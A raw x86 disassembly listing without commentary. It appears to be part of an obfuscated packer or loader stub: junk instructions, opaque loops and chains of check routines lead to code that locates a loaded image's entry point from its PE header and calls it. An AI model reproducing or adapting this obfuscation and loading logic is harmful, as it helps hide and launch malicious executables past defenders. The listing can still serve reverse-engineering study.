  41c2c8:	cmp    DWORD PTR ds:0x426edd,0x7
  41c2cf:	jle    0x41c31b
  41c2d5:	jmp    0x41c2ed
  41c2da:	push   DWORD PTR [ebp-0x20]
  41c2dd:	push   0x4e76
  41c2e2:	push   0x4592
  41c2e7:	call   DWORD PTR ds:0x42fa18
  41c2ed:	cmp    DWORD PTR ds:0x426edd,0x8
  41c2f4:	jne    0x41c309
  41c2fa:	xor    edx,edx
  41c2fc:	add    edx,DWORD PTR ds:0x426edd
  41c302:	dec    edx
  41c303:	mov    DWORD PTR ds:0x426edd,edx
  41c309:	mov    edx,DWORD PTR ds:0x426edd
  41c30f:	dec    edx
  41c310:	mov    DWORD PTR ds:0x426edd,edx
  41c316:	jmp    0x41c2bb
  41c31b:	mov    DWORD PTR [esp+0x1c],0xf89c85b4
  41c323:	lea    eax,[esp+0x34]
  41c327:	mov    DWORD PTR [esp+0x44],eax
  41c32b:	mov    esi,DWORD PTR ds:0x428e65
  41c331:	mov    ebx,DWORD PTR ds:0x42af19
  41c337:	sub    esi,ebx
  41c339:	sub    esi,DWORD PTR [esi+ebx*1]
  41c33c:	lea    eax,[esp+0x30]
  41c340:	mov    DWORD PTR [esp+0x28],eax
  41c344:	sub    DWORD PTR ds:0x426ea9,0x492f
  41c34e:	mov    eax,ds:0x4262c9
  41c353:	mov    edx,DWORD PTR ds:0x426ef9
  41c359:	sbb    DWORD PTR ds:0x426f05,edx
  41c35f:	mov    eax,DWORD PTR [eax+0x1c8]
  41c365:	mov    DWORD PTR ds:0x426f29,0x788d
  41c36f:	mov    eax,DWORD PTR [eax]
  41c371:	mov    edx,DWORD PTR [esp+0x28]
  41c375:	and    DWORD PTR ds:0x426efd,0x0
  41c37f:	jmp    0x41c393
  41c384:	xor    esi,esi
  41c386:	xor    esi,DWORD PTR ds:0x426efd
  41c38c:	inc    esi
  41c38d:	mov    DWORD PTR ds:0x426efd,esi
  41c393:	cmp    DWORD PTR ds:0x426efd,0x1a
  41c39a:	jae    0x41c3cb
  41c3a0:	cmp    DWORD PTR ds:0x426efd,0x1c
  41c3a7:	jge    0x41c3cb
  41c3ad:	jmp    0x41c3c6
  41c3b2:	push   DWORD PTR [ebp-0xc]
  41c3b5:	push   0x4c83
  41c3ba:	push   DWORD PTR [ebp-0x14]
  41c3bd:	push   DWORD PTR [ebp-0x1c]
  41c3c0:	call   DWORD PTR ds:0x42fa4c
  41c3c6:	jmp    0x41c384
  41c3cb:	mov    esi,0x75108b3
  41c3d0:	and    DWORD PTR ds:0x426e81,0x1564
  41c3da:	xor    eax,esi
  41c3dc:	mov    ebx,0x3272fa
  41c3e1:	add    eax,ebx
  41c3e3:	mov    DWORD PTR [edx],eax
  41c3e5:	mov    DWORD PTR ds:0x426ea1,0x7a67
  41c3ef:	mov    eax,ds:0x426d99
  41c3f4:	mov    DWORD PTR ds:0x426f1d,0x65da
  41c3fe:	cmp    eax,0x455dedfa
  41c403:	mov    DWORD PTR ds:0x426ea9,0x55fc
  41c40d:	jne    0x41c4f5
  41c413:	and    DWORD PTR ds:0x426ef5,0x0
  41c41d:	mov    eax,ds:0x426ef5
  41c422:	inc    eax
  41c423:	mov    ds:0x426ef5,eax
  41c428:	cmp    DWORD PTR ds:0x426ef5,0xd
  41c42f:	jl     0x41c479
  41c435:	jmp    0x41c454
  41c43a:	push   0x59de
  41c43f:	push   0x39ed
  41c444:	push   0x1b7c
  41c449:	push   0x44aa
  41c44e:	call   DWORD PTR ds:0x42fa1c
  41c454:	cmp    DWORD PTR ds:0x426ef5,0xc
  41c45b:	jne    0x41c46c
  41c461:	mov    eax,ds:0x426ef5
  41c466:	inc    eax
  41c467:	mov    ds:0x426ef5,eax
  41c46c:	cmp    DWORD PTR ds:0x426ef5,0x1f
  41c473:	jb     0x41c41d
  41c479:	mov    eax,DWORD PTR [esp+0x10]
  41c47d:	xor    edx,DWORD PTR ds:0x426ecd
  41c483:	mov    edx,DWORD PTR ds:0x4262c9
  41c489:	mov    edx,DWORD PTR [edx+0x198]
  41c48f:	add    DWORD PTR ds:0x426ec5,0x6b2
  41c499:	xor    eax,esi
  41c49b:	adc    DWORD PTR ds:0x426f25,0x426ef9
  41c4a5:	add    eax,ebx
  41c4a7:	and    DWORD PTR ds:0x426e85,0x426f15
  41c4b1:	mov    DWORD PTR [edx],eax
  41c4b3:	mov    eax,DWORD PTR [esp+0x10]
  41c4b7:	sub    DWORD PTR ds:0x426ec9,0x4e94
  41c4c1:	xor    eax,esi
  41c4c3:	add    eax,ebx
  41c4c5:	adc    DWORD PTR ds:0x426e81,0x426e91
  41c4cf:	mov    ds:0x426d99,eax
  41c4d4:	mov    eax,DWORD PTR [esp+0x10]
  41c4d8:	adc    DWORD PTR ds:0x426eed,0x426ef9
  41c4e2:	xor    eax,esi
  41c4e4:	add    eax,ebx
  41c4e6:	sub    DWORD PTR ds:0x426ea9,0x426e85
  41c4f0:	mov    ds:0x4263c1,eax
  41c4f5:	mov    eax,ds:0x4262c9
  41c4fa:	sbb    DWORD PTR ds:0x426f05,0x67a3
  41c504:	mov    eax,DWORD PTR [eax+0x18c]
  41c50a:	adc    DWORD PTR ds:0x426e91,0x180f
  41c514:	mov    eax,DWORD PTR [eax]
  41c516:	sbb    DWORD PTR ds:0x426eb1,0x4112
  41c520:	mov    DWORD PTR [esp+0x48],eax
  41c524:	adc    DWORD PTR ds:0x426eb9,edi
  41c52a:	mov    eax,0xf89c85b9
  41c52f:	mov    DWORD PTR [esp+0x38],eax
  41c533:	inc    DWORD PTR ds:0x426e8d
  41c539:	mov    DWORD PTR [esp+0x38],eax
  41c53d:	xor    DWORD PTR ds:0x426f11,0x441e
  41c547:	mov    DWORD PTR [esp+0x38],eax
  41c54b:	mov    DWORD PTR [esp+0x38],ecx
  41c54f:	neg    DWORD PTR ds:0x426f25
  41c555:	mov    DWORD PTR [esp+0x28],eax
  41c559:	movzx  eax,WORD PTR ds:0x426ec5
  41c560:	sbb    eax,DWORD PTR ds:0x426ee1
  41c566:	mov    ds:0x426ec5,eax
  41c56b:	mov    DWORD PTR [esp+0x28],0xf89c85bd
  41c573:	sbb    DWORD PTR ds:0x426ef9,0x58a6
  41c57d:	mov    eax,DWORD PTR [esp+0x10]
  41c581:	xor    eax,esi
  41c583:	add    eax,ebx
  41c585:	jmp    0x41c7a3
  41c58a:	mov    DWORD PTR ds:0x426eb5,0x6384
  41c594:	mov    al,ds:0x42647f
  41c599:	mov    DWORD PTR ds:0x426f01,0x6aa0
  41c5a3:	cmp    al,BYTE PTR ds:0x42648a
  41c5a9:	mov    DWORD PTR ds:0x426e85,0x34fb
  41c5b3:	jne    0x41c211
  41c5b9:	mov    DWORD PTR ds:0x426e99,0x7ac4
  41c5c3:	mov    al,ds:0x42649c
  41c5c8:	cmp    al,BYTE PTR ds:0x4264ab
  41c5ce:	mov    DWORD PTR ds:0x426e99,0x679f
  41c5d8:	jne    0x41c211
  41c5de:	push   0x4264b5
  41c5e3:	or     DWORD PTR ds:0x426e99,0x4d97
  41c5ed:	push   0x4264c5
  41c5f2:	call   edi
  41c5f4:	test   eax,eax
  41c5f6:	mov    DWORD PTR ds:0x426ecd,0x4160
  41c600:	je     0x41c211
  41c606:	mov    DWORD PTR ds:0x426ec5,0x29ef
  41c610:	mov    al,ds:0x4264db
  41c615:	cmp    al,BYTE PTR ds:0x4264e6
  41c61b:	jne    0x41c211
  41c621:	mov    al,ds:0x4264f8
  41c626:	mov    DWORD PTR ds:0x426ecd,0x6d7c
  41c630:	cmp    al,BYTE PTR ds:0x426507
  41c636:	mov    DWORD PTR ds:0x426ee5,0x7eb8
  41c640:	jne    0x41c211
  41c646:	sub    DWORD PTR ds:0x426ef9,0x282b
  41c650:	push   0x426511
  41c655:	push   0x426521
  41c65a:	call   edi
  41c65c:	sbb    DWORD PTR ds:0x426edd,0x426e9d
  41c666:	test   eax,eax
  41c668:	mov    DWORD PTR ds:0x426ee9,0x3f4b
  41c672:	je     0x41c211
  41c678:	and    DWORD PTR ds:0x426e91,0x0
  41c682:	xor    eax,eax
  41c684:	xor    eax,DWORD PTR ds:0x426e91
  41c68a:	inc    eax
  41c68b:	mov    ds:0x426e91,eax
  41c690:	cmp    DWORD PTR ds:0x426e91,0x9
  41c697:	ja     0x41c6d0
  41c69d:	jmp    0x41c6a8
  41c6a2:	call   DWORD PTR ds:0x42fa20
  41c6a8:	cmp    DWORD PTR ds:0x426e91,0x8
  41c6af:	jne    0x41c6c3
  41c6b5:	xor    eax,eax
  41c6b7:	add    eax,DWORD PTR ds:0x426e91
  41c6bd:	inc    eax
  41c6be:	mov    ds:0x426e91,eax
  41c6c3:	cmp    DWORD PTR ds:0x426e91,0x1a
  41c6ca:	jb     0x41c682
  41c6d0:	mov    eax,DWORD PTR [esp+0x1c]
  41c6d4:	adc    DWORD PTR ds:0x426f01,ecx
  41c6da:	mov    ecx,DWORD PTR [esp+0x28]
  41c6de:	xor    eax,esi
  41c6e0:	lea    eax,[eax+ecx*1+0x3272fa]
  41c6e7:	push   eax
  41c6e8:	xor    eax,DWORD PTR ds:0x426eb1
  41c6ee:	mov    eax,DWORD PTR [esp+0x3c]
  41c6f2:	adc    DWORD PTR ds:0x426ec1,0x19c6
  41c6fc:	xor    eax,esi
  41c6fe:	sbb    DWORD PTR ds:0x426ec5,0x426ea9
  41c708:	lea    eax,[ebp+eax*1+0x327302]
  41c70f:	xor    DWORD PTR ds:0x426ec1,0x34b0
  41c719:	push   eax
  41c71a:	xor    eax,DWORD PTR ds:0x426e99
  41c720:	mov    eax,ds:0x4262c9
  41c725:	adc    DWORD PTR ds:0x426ea5,0x426f09
  41c72f:	push   DWORD PTR [eax+0x1bc]
  41c735:	adc    DWORD PTR ds:0x426f0d,0x426ea5
  41c73f:	call   0x41d27f
  41c744:	mov    eax,DWORD PTR [esp+0x1c]
  41c748:	mov    ecx,DWORD PTR [esp+0x28]
  41c74c:	xor    eax,esi
  41c74e:	and    DWORD PTR ds:0x426e85,0x0
  41c758:	mov    edx,DWORD PTR ds:0x426e85
  41c75e:	inc    edx
  41c75f:	mov    DWORD PTR ds:0x426e85,edx
  41c765:	cmp    DWORD PTR ds:0x426e85,0x22
  41c76c:	jl     0x41c79c
  41c772:	jmp    0x41c78f
  41c777:	push   0x426000
  41c77c:	push   0x29cf
  41c781:	push   0x6715
  41c786:	push   DWORD PTR [ebp-0x18]
  41c789:	call   DWORD PTR ds:0x42fa24
  41c78f:	cmp    DWORD PTR ds:0x426e85,0x1b
  41c796:	jb     0x41c758
  41c79c:	lea    eax,[ecx+eax*1+0x3272fa]
  41c7a3:	mov    ecx,DWORD PTR [esp+0x1c]
  41c7a7:	mov    edx,DWORD PTR [esp+0x1c]
  41c7ab:	xor    edx,esi
  41c7ad:	sbb    DWORD PTR ds:0x426f29,0x426e8d
  41c7b7:	xor    ecx,esi
  41c7b9:	add    ecx,edx
  41c7bb:	sbb    edx,DWORD PTR ds:0x426f1d
  41c7c1:	mov    edx,DWORD PTR [esp+0x1c]
  41c7c5:	adc    DWORD PTR ds:0x426ef9,0x135a
  41c7cf:	xor    edx,esi
  41c7d1:	mov    DWORD PTR ds:0x426ee5,0x2979
  41c7db:	lea    ecx,[ecx+edx*1+0x9758ee]
  41c7e2:	mov    DWORD PTR ds:0x426f2d,0x689
  41c7ec:	mov    DWORD PTR [esp+0x28],eax
  41c7f0:	cmp    eax,ecx
  41c7f2:	mov    DWORD PTR ds:0x426efd,0x13db
  41c7fc:	jbe    0x41c58a
  41c802:	mov    eax,DWORD PTR [ebp+0xc]
  41c805:	mov    ds:0x42614d,eax
  41c80a:	and    DWORD PTR ds:0x426eb1,0x0
  41c814:	jmp    0x41c824
  41c819:	mov    eax,ds:0x426eb1
  41c81e:	inc    eax
  41c81f:	mov    ds:0x426eb1,eax
  41c824:	cmp    DWORD PTR ds:0x426eb1,0x19
  41c82b:	jae    0x41c851
  41c831:	cmp    DWORD PTR ds:0x426eb1,0x20
  41c838:	jl     0x41c851
  41c83e:	jmp    0x41c84c
  41c843:	push   DWORD PTR [ebp-0xc]
  41c846:	call   DWORD PTR ds:0x42fa28
  41c84c:	jmp    0x41c819
  41c851:	mov    eax,DWORD PTR [ebp+0x10]
  41c854:	mov    ds:0x4263a9,eax
  41c859:	mov    ecx,DWORD PTR ds:0x42af21
  41c85f:	mov    eax,ds:0x42af2d
  41c864:	sub    eax,ecx
  41c866:	xor    ecx,DWORD PTR [ecx+eax*1]
  41c869:	mov    eax,ds:0x42614d
  41c86e:	inc    ecx
  41c86f:	mov    ecx,DWORD PTR [esp+0x44]
  41c873:	sbb    DWORD PTR ds:0x426f0d,0x426ed5
  41c87d:	sub    eax,ebx
  41c87f:	sub    DWORD PTR ds:0x426eed,0x426f05
  41c889:	xor    eax,esi
  41c88b:	mov    DWORD PTR [ecx],eax
  41c88d:	mov    DWORD PTR ds:0x426ea1,0x1d16
  41c897:	lea    eax,[esp+0x20]
  41c89b:	mov    DWORD PTR ds:0x426f1d,0x743e
  41c8a5:	mov    DWORD PTR [esp+0x4c],eax
  41c8a9:	mov    DWORD PTR ds:0x426eb5,0x1725
  41c8b3:	lea    eax,[ebp+0x4]
  41c8b6:	mov    DWORD PTR ds:0x426f0d,0x331f
  41c8c0:	mov    DWORD PTR [esp+0x20],eax
  41c8c4:	mov    DWORD PTR ds:0x426ea1,0x4fd1
  41c8ce:	mov    al,ds:0x426537
  41c8d3:	cmp    al,BYTE PTR ds:0x426542
  41c8d9:	jne    0x41c211
  41c8df:	mov    al,ds:0x426554
  41c8e4:	mov    DWORD PTR ds:0x426e99,0x22c3
  41c8ee:	cmp    al,BYTE PTR ds:0x426563
  41c8f4:	mov    DWORD PTR ds:0x426f21,0x5c30
  41c8fe:	jne    0x41c211
  41c904:	sub    DWORD PTR ds:0x426eb5,0x53da
  41c90e:	push   0x42656d
  41c913:	sbb    DWORD PTR ds:0x426f0d,0x426f15
  41c91d:	push   0x42657d
  41c922:	sbb    DWORD PTR ds:0x426e81,0x426e95
  41c92c:	call   edi
  41c92e:	test   eax,eax
  41c930:	mov    DWORD PTR ds:0x426f09,0x3f7d
  41c93a:	je     0x41c211
  41c940:	mov    al,ds:0x426593
  41c945:	mov    DWORD PTR ds:0x426f09,0x7a71
  41c94f:	cmp    al,BYTE PTR ds:0x42659e
  41c955:	mov    DWORD PTR ds:0x426f21,0x448e
  41c95f:	jne    0x41c211
  41c965:	mov    al,ds:0x4265b0
  41c96a:	cmp    al,BYTE PTR ds:0x4265bf
  41c970:	jne    0x41c211
  41c976:	push   0x4265c9
  41c97b:	add    DWORD PTR ds:0x426eb9,0x4508
  41c985:	push   0x4265d9
  41c98a:	call   edi
  41c98c:	test   eax,eax
  41c98e:	je     0x41c211
  41c994:	mov    DWORD PTR ds:0x426ed1,0x4635
  41c99e:	mov    al,ds:0x4265ef
  41c9a3:	mov    DWORD PTR ds:0x426f11,0x2d29
  41c9ad:	cmp    al,BYTE PTR ds:0x4265fa
  41c9b3:	mov    DWORD PTR ds:0x426f1d,0x5285
  41c9bd:	jne    0x41c211
  41c9c3:	mov    DWORD PTR ds:0x426ecd,0x17c5
  41c9cd:	mov    al,ds:0x42660c
  41c9d2:	mov    DWORD PTR ds:0x426ecd,0x1f4b
  41c9dc:	cmp    al,BYTE PTR ds:0x42661b
  41c9e2:	jne    0x41c211
  41c9e8:	push   0x426625
  41c9ed:	adc    DWORD PTR ds:0x426ef1,0x426ee5
  41c9f7:	push   0x426635
  41c9fc:	call   edi
  41c9fe:	adc    DWORD PTR ds:0x426edd,0x72d
  41ca08:	test   eax,eax
  41ca0a:	je     0x41c211
  41ca10:	mov    DWORD PTR ds:0x426ed9,0x3296
  41ca1a:	mov    al,ds:0x42664b
  41ca1f:	mov    DWORD PTR ds:0x426e91,0x9e5
  41ca29:	cmp    al,BYTE PTR ds:0x426656
  41ca2f:	mov    DWORD PTR ds:0x426ee1,0x4731
  41ca39:	jne    0x41c211
  41ca3f:	mov    al,ds:0x426668
  41ca44:	cmp    al,BYTE PTR ds:0x426677
  41ca4a:	jne    0x41c211
  41ca50:	xor    DWORD PTR ds:0x426e85,0x78df
  41ca5a:	push   0x426681
  41ca5f:	push   0x426691
  41ca64:	call   edi
  41ca66:	test   eax,eax
  41ca68:	je     0x41c211
  41ca6e:	mov    DWORD PTR ds:0x426efd,0x48d1
  41ca78:	mov    al,ds:0x4266a7
  41ca7d:	mov    DWORD PTR ds:0x426eb1,0x58ba
  41ca87:	cmp    al,BYTE PTR ds:0x4266b2
  41ca8d:	jne    0x41c211
  41ca93:	mov    al,ds:0x4266c4
  41ca98:	mov    DWORD PTR ds:0x426ea9,0x5172
  41caa2:	cmp    al,BYTE PTR ds:0x4266d3
  41caa8:	mov    DWORD PTR ds:0x426ecd,0x25dc
  41cab2:	jne    0x41c211
  41cab8:	add    DWORD PTR ds:0x426ef5,0x426ea9
  41cac2:	push   0x4266dd
  41cac7:	mov    DWORD PTR ds:0x426f1d,0x534b
  41cad1:	push   0x4266ed
  41cad6:	xor    DWORD PTR ds:0x426e8d,0x426e89
  41cae0:	call   edi
  41cae2:	test   eax,eax
  41cae4:	mov    DWORD PTR ds:0x426f09,0x17e9
  41caee:	je     0x41c211
  41caf4:	mov    DWORD PTR ds:0x426f15,0x546d
  41cafe:	mov    al,ds:0x426703
  41cb03:	mov    DWORD PTR ds:0x426ec9,0x6884
  41cb0d:	cmp    al,BYTE PTR ds:0x42670e
  41cb13:	mov    DWORD PTR ds:0x426e95,0x724e
  41cb1d:	jne    0x41c211
  41cb23:	mov    DWORD PTR ds:0x426eb1,0x7b3e
  41cb2d:	mov    al,ds:0x426720
  41cb32:	mov    DWORD PTR ds:0x426ea9,0xb8a
  41cb3c:	cmp    al,BYTE PTR ds:0x42672f
  41cb42:	mov    DWORD PTR ds:0x426ea5,0xfff
  41cb4c:	jne    0x41c211
  41cb52:	adc    DWORD PTR ds:0x426e81,0x426ed5
  41cb5c:	push   0x426739
  41cb61:	push   0x426749
  41cb66:	call   edi
  41cb68:	mov    DWORD PTR ds:0x426eb1,0x513e
  41cb72:	test   eax,eax
  41cb74:	je     0x41c211
  41cb7a:	mov    al,ds:0x42675f
  41cb7f:	mov    DWORD PTR ds:0x426e8d,0x24d0
  41cb89:	cmp    al,BYTE PTR ds:0x42676a
  41cb8f:	jne    0x41c211
  41cb95:	mov    DWORD PTR ds:0x426eb1,0x7a1a
  41cb9f:	mov    al,ds:0x42677c
  41cba4:	mov    DWORD PTR ds:0x426ef5,0x1244
  41cbae:	cmp    al,BYTE PTR ds:0x42678b
  41cbb4:	mov    DWORD PTR ds:0x426ed1,0x3050
  41cbbe:	jne    0x41c211
  41cbc4:	sub    DWORD PTR ds:0x426ee1,0x426f25
  41cbce:	push   0x426795
  41cbd3:	add    DWORD PTR ds:0x426f11,0x40a8
  41cbdd:	push   0x4267a5
  41cbe2:	sub    DWORD PTR ds:0x426ef9,0x426e9d
  41cbec:	call   edi
  41cbee:	adc    DWORD PTR ds:0x426e99,0x426f0d
  41cbf8:	test   eax,eax
  41cbfa:	je     0x41c211
  41cc00:	mov    al,ds:0x4267bb
  41cc05:	mov    DWORD PTR ds:0x426f05,0xc7b
  41cc0f:	cmp    al,BYTE PTR ds:0x4267c6
  41cc15:	mov    DWORD PTR ds:0x426eb9,0x70f1
  41cc1f:	jne    0x41c211
  41cc25:	mov    al,ds:0x4267d8
  41cc2a:	mov    DWORD PTR ds:0x426f09,0x320
  41cc34:	cmp    al,BYTE PTR ds:0x4267e7
  41cc3a:	mov    DWORD PTR ds:0x426ee1,0xc80
  41cc44:	jne    0x41c211
  41cc4a:	sbb    DWORD PTR ds:0x426e85,0x426ea9
  41cc54:	push   0x4267f1
  41cc59:	adc    DWORD PTR ds:0x426f21,0x426f09
  41cc63:	push   0x426801
  41cc68:	call   edi
  41cc6a:	test   eax,eax
  41cc6c:	mov    DWORD PTR ds:0x426e9d,0x1d82
  41cc76:	je     0x41c211
  41cc7c:	mov    DWORD PTR ds:0x426e8d,0x4c1f
  41cc86:	mov    al,ds:0x426817
  41cc8b:	mov    DWORD PTR ds:0x426ebd,0x2305
  41cc95:	cmp    al,BYTE PTR ds:0x426822
  41cc9b:	mov    DWORD PTR ds:0x426e85,0x52ee
  41cca5:	jne    0x41c211
  41ccab:	mov    DWORD PTR ds:0x426eed,0x1308
  41ccb5:	mov    al,ds:0x426834
  41ccba:	cmp    al,BYTE PTR ds:0x426843
  41ccc0:	mov    DWORD PTR ds:0x426ea9,0x1ac4
  41ccca:	jne    0x41c211
  41ccd0:	push   0x42684d
  41ccd5:	push   0x42685d
  41ccda:	call   edi
  41ccdc:	xor    DWORD PTR ds:0x426eb5,0x537b
  41cce6:	test   eax,eax
  41cce8:	mov    DWORD PTR ds:0x426f2d,0x4412
  41ccf2:	je     0x41c211
  41ccf8:	mov    al,ds:0x426873
  41ccfd:	mov    DWORD PTR ds:0x426eb1,0x52c5
  41cd07:	cmp    al,BYTE PTR ds:0x42687e
  41cd0d:	mov    DWORD PTR ds:0x426f01,0x16df
  41cd17:	jne    0x41c211
  41cd1d:	mov    DWORD PTR ds:0x426ee1,0xd56
  41cd27:	mov    al,ds:0x426890
  41cd2c:	mov    DWORD PTR ds:0x426ed1,0x624d
  41cd36:	cmp    al,BYTE PTR ds:0x42689f
  41cd3c:	mov    DWORD PTR ds:0x426e95,0x6fa7
  41cd46:	jne    0x41c211
  41cd4c:	push   0x4268a9
  41cd51:	push   0x4268b9
  41cd56:	call   edi
  41cd58:	test   eax,eax
  41cd5a:	je     0x41c211
  41cd60:	mov    al,ds:0x4268cf
  41cd65:	mov    DWORD PTR ds:0x426ea5,0x6b61
  41cd6f:	cmp    al,BYTE PTR ds:0x4268da
  41cd75:	mov    DWORD PTR ds:0x426ef1,0x607d
  41cd7f:	jne    0x41c211
  41cd85:	mov    al,ds:0x4268ec
  41cd8a:	mov    DWORD PTR ds:0x426f11,0x76ce
  41cd94:	cmp    al,BYTE PTR ds:0x4268fb
  41cd9a:	mov    DWORD PTR ds:0x426ea9,0x7be9
  41cda4:	jne    0x41c211
  41cdaa:	push   0x426905
  41cdaf:	xor    DWORD PTR ds:0x426e89,0x5d69
  41cdb9:	push   0x426915
  41cdbe:	call   edi
  41cdc0:	test   eax,eax
  41cdc2:	je     0x41c211
  41cdc8:	mov    al,ds:0x42692b
  41cdcd:	mov    DWORD PTR ds:0x426eed,0x2af5
  41cdd7:	cmp    al,BYTE PTR ds:0x426936
  41cddd:	mov    DWORD PTR ds:0x426ed9,0x56c9
  41cde7:	jne    0x41c211
  41cded:	mov    DWORD PTR ds:0x426f09,0x21f5
  41cdf7:	mov    al,ds:0x426948
  41cdfc:	cmp    al,BYTE PTR ds:0x426957
  41ce02:	jne    0x41c211
  41ce08:	push   0x426961
  41ce0d:	sub    DWORD PTR ds:0x426ef1,0x426f19
  41ce17:	push   0x426971
  41ce1c:	call   edi
  41ce1e:	or     DWORD PTR ds:0x426f11,0x426ea1
  41ce28:	test   eax,eax
  41ce2a:	je     0x41c211
  41ce30:	mov    DWORD PTR ds:0x426f1d,0x33c9
  41ce3a:	mov    al,ds:0x426987
  41ce3f:	cmp    al,BYTE PTR ds:0x426992
  41ce45:	jne    0x41c211
  41ce4b:	mov    al,ds:0x4269a4
  41ce50:	cmp    al,BYTE PTR ds:0x4269b3
  41ce56:	jne    0x41c211
  41ce5c:	push   0x4269bd
  41ce61:	push   0x4269cd
  41ce66:	call   edi
  41ce68:	test   eax,eax
  41ce6a:	je     0x41c211
  41ce70:	mov    al,ds:0x4269e3
  41ce75:	cmp    al,BYTE PTR ds:0x4269ee
  41ce7b:	jne    0x41c211
  41ce81:	mov    al,ds:0x426a00
  41ce86:	cmp    al,BYTE PTR ds:0x426a0f
  41ce8c:	jne    0x41c211
  41ce92:	push   0x426a19
  41ce97:	push   0x426a29
  41ce9c:	call   edi
  41ce9e:	test   eax,eax
  41cea0:	je     0x41c211
  41cea6:	mov    al,ds:0x426a3f
  41ceab:	cmp    al,BYTE PTR ds:0x426a4a
  41ceb1:	jne    0x41c211
  41ceb7:	mov    al,ds:0x426a5c
  41cebc:	cmp    al,BYTE PTR ds:0x426a6b
  41cec2:	jne    0x41c211
  41cec8:	push   0x426a75
  41cecd:	push   0x426a85
  41ced2:	call   edi
  41ced4:	test   eax,eax
  41ced6:	je     0x41c211
  41cedc:	mov    al,ds:0x426a9b
  41cee1:	cmp    al,BYTE PTR ds:0x426aa6
  41cee7:	jne    0x41c211
  41ceed:	mov    al,ds:0x426ab8
  41cef2:	cmp    al,BYTE PTR ds:0x426ac7
  41cef8:	jne    0x41c211
  41cefe:	push   0x426ad1
  41cf03:	push   0x426ae1
  41cf08:	call   edi
  41cf0a:	test   eax,eax
  41cf0c:	je     0x41c211
  41cf12:	mov    al,ds:0x426af7
  41cf17:	cmp    al,BYTE PTR ds:0x426b02
  41cf1d:	jne    0x41c211
  41cf23:	mov    al,ds:0x426b14
  41cf28:	cmp    al,BYTE PTR ds:0x426b23
  41cf2e:	jne    0x41c211
  41cf34:	push   0x426b2d
  41cf39:	push   0x426b3d
  41cf3e:	call   edi
  41cf40:	test   eax,eax
  41cf42:	je     0x41c211
  41cf48:	mov    al,ds:0x426b53
  41cf4d:	cmp    al,BYTE PTR ds:0x426b5e
  41cf53:	jne    0x41c211
  41cf59:	mov    al,ds:0x426b70
  41cf5e:	cmp    al,BYTE PTR ds:0x426b7f
  41cf64:	jne    0x41c211
  41cf6a:	push   0x426b89
  41cf6f:	push   0x426b99
  41cf74:	call   edi
  41cf76:	test   eax,eax
  41cf78:	je     0x41c211
  41cf7e:	mov    al,ds:0x426baf
  41cf83:	cmp    al,BYTE PTR ds:0x426bba
  41cf89:	jne    0x41c211
  41cf8f:	mov    al,ds:0x426bcc
  41cf94:	cmp    al,BYTE PTR ds:0x426bdb
  41cf9a:	jne    0x41c211
  41cfa0:	push   0x426be5
  41cfa5:	push   0x426bf5
  41cfaa:	call   edi
  41cfac:	test   eax,eax
  41cfae:	je     0x41c211
  41cfb4:	mov    al,ds:0x426c0b
  41cfb9:	cmp    al,BYTE PTR ds:0x426c16
  41cfbf:	jne    0x41c211
  41cfc5:	mov    al,ds:0x426c28
  41cfca:	cmp    al,BYTE PTR ds:0x426c37
  41cfd0:	jne    0x41c211
  41cfd6:	push   0x426c41
  41cfdb:	push   0x426c51
  41cfe0:	call   edi
  41cfe2:	test   eax,eax
  41cfe4:	je     0x41c211
  41cfea:	mov    al,ds:0x426c67
  41cfef:	cmp    al,BYTE PTR ds:0x426c72
  41cff5:	jne    0x41c211
  41cffb:	mov    al,ds:0x426c84
  41d000:	cmp    al,BYTE PTR ds:0x426c93
  41d006:	jne    0x41c211
  41d00c:	push   0x426c9d
  41d011:	push   0x426cad
  41d016:	call   edi
  41d018:	test   eax,eax
  41d01a:	je     0x41c211
  41d020:	mov    eax,DWORD PTR [esp+0x34]
  41d024:	cmp    eax,0xf89c85b4
  41d029:	je     0x41d088
  41d02f:	mov    eax,DWORD PTR [esp+0x10]
  41d033:	mov    ecx,DWORD PTR [esp+0x30]
  41d037:	xor    eax,esi
  41d039:	add    eax,ebx
  41d03b:	cmp    eax,ecx
  41d03d:	je     0x41d088
  41d043:	mov    eax,ds:0x4262c9
  41d048:	mov    eax,DWORD PTR [eax+0x194]
  41d04e:	mov    ecx,DWORD PTR [eax]
  41d050:	mov    eax,DWORD PTR [ecx+0x3c]
  41d053:	push   DWORD PTR ds:0x4263a9
  41d059:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41d05d:	push   DWORD PTR ds:0x42614d
  41d063:	add    eax,ecx
  41d065:	mov    ecx,DWORD PTR ds:0x4262c9
  41d06b:	mov    ecx,DWORD PTR [ecx+0x194]
  41d071:	push   DWORD PTR [ecx]
  41d073:	call   eax
  41d075:	mov    ecx,DWORD PTR ds:0x4262c9
  41d07b:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41d081:	mov    DWORD PTR [ecx],eax
  41d083:	jmp    0x41d259
  41d088:	mov    eax,DWORD PTR [esp+0x10]
  41d08c:	mov    ecx,DWORD PTR [esp+0x48]
  41d090:	xor    eax,esi
  41d092:	add    eax,ebx
  41d094:	cmp    eax,ecx
  41d096:	jne    0x41d101
  41d09c:	mov    eax,DWORD PTR [esp+0x10]
  41d0a0:	mov    ecx,DWORD PTR ds:0x4262c9
  41d0a6:	mov    ecx,DWORD PTR [ecx+0x198]
  41d0ac:	xor    eax,esi
  41d0ae:	add    eax,ebx
  41d0b0:	cmp    eax,DWORD PTR [ecx]
  41d0b2:	jne    0x41d0da
  41d0b8:	mov    eax,DWORD PTR [esp+0x10]
  41d0bc:	push   0xffffffff
  41d0be:	push   0x70941f8a
  41d0c3:	xor    eax,esi
  41d0c5:	add    eax,ebx
  41d0c7:	push   eax
  41d0c8:	push   0xf89c85b9
  41d0cd:	push   DWORD PTR [esp+0x2c]
  41d0d1:	push   DWORD PTR [esp+0x24]
  41d0d5:	call   0x417355
  41d0da:	push   DWORD PTR [esp+0x1c]
  41d0de:	push   DWORD PTR [esp+0x14]
  41d0e2:	call   0x401000
  41d0e7:	mov    eax,DWORD PTR [esp+0x10]
  41d0eb:	xor    eax,esi
  41d0ed:	add    eax,ebx
  41d0ef:	mov    ds:0x426355,eax
  41d0f4:	mov    eax,DWORD PTR [esp+0x10]
  41d0f8:	xor    eax,esi
  41d0fa:	add    eax,ebx
  41d0fc:	mov    ds:0x42634d,eax
  41d101:	mov    eax,DWORD PTR [esp+0x20]
  41d105:	test   eax,eax
  41d107:	je     0x41d259
  41d10d:	mov    DWORD PTR [esp+0x50],0xf152c3c
  41d115:	mov    DWORD PTR [esp+0x54],0x712edcf
